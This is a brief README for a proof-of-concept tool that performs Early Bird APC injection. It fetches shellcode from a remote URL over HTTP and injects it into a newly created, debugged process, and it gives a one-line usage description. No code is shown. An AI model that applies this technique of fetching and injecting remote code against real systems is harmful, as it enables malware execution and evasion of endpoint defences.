## RemoteEarlyBird

PoC to perform Early Bird APC Injection in a debugged process using shellcode retrieved from remote server via HTTP.

### Usage

`remoteearlybird <url> <process>` -> Fetches payload from `<url>`, creates new `<process>` in debugged state, and queues the main thread for an APC and detaches from the remote process.